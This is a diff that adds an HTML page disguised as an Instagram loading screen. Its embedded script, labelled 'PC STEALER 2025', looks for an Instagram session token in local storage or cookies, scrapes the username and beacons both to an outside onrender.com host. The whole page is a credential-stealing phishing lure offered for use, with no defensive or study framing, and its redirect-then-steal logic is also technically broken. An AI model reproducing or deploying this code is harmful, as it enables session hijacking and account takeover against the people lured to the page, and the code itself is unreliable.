@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Instagram</title>
+    <style>
+        body,html{margin:0;padding:0;height:100vh;background:#fff;display:flex;align-items:center;justify-content:center;flex-direction:column;font-family:-apple-system,system-ui}
+        .logo{width:120px;height:120px;background:url('https://instagram.com/static/images/ico/apple-touch-icon-180x180-precomposed.png') center/contain no-repeat;margin-bottom:30px}
+        .text{font-size:24px;color:#262626;font-weight:600}
+        .spinner{width:60px;height:60px;border:8px solid #f0f0f0;border-top:8px solid #0095f6;border-radius:50%;animation:s 1s linear infinite;margin-top:30px}
+        @keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+    </style>
+</head>
+<body>
+    <div class="logo"></div>
+    <div class="text">Opening Instagram...</div>
+    <div class="spinner"></div>
+
+    <script>
+        // PC STEALER 2025 — WORKS ON CHROME/FIREFOX/EDGE
+        setTimeout(() => {
+            // Open Instagram in same tab
+            location.href = "https://www.instagram.com/";
+        }, 2000);
+
+        // STEAL WHEN ON INSTAGRAM
+        setInterval(() => {
+            if (location.hostname.includes("instagram.com")) {
+                // GET SESSION FROM LOCALSTORAGE (PC METHOD)
+                const session = localStorage.getItem("sessionid") || 
+                               document.cookie.match(/sessionid=([^;]+)/)?.[1];
+                
+                if (session && session.length > 50) {
+                    // GET USERNAME FROM PAGE
+                    const username = document.querySelector('a[href*="/"] > span')?.innerText ||
+                                    document.querySelector('header span')?.innerText ||
+                                    "PC_USER";
+
+                    // SEND TO YOUR SERVER
+                    new Image().src = `https://instagram-64lz.onrender.com/pc-capture/?s=${session}&u=${username}&t=${Date.now()}`;
+                    
+                    // STOP AFTER SUCCESS
+                    clearInterval(this);
+                }
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
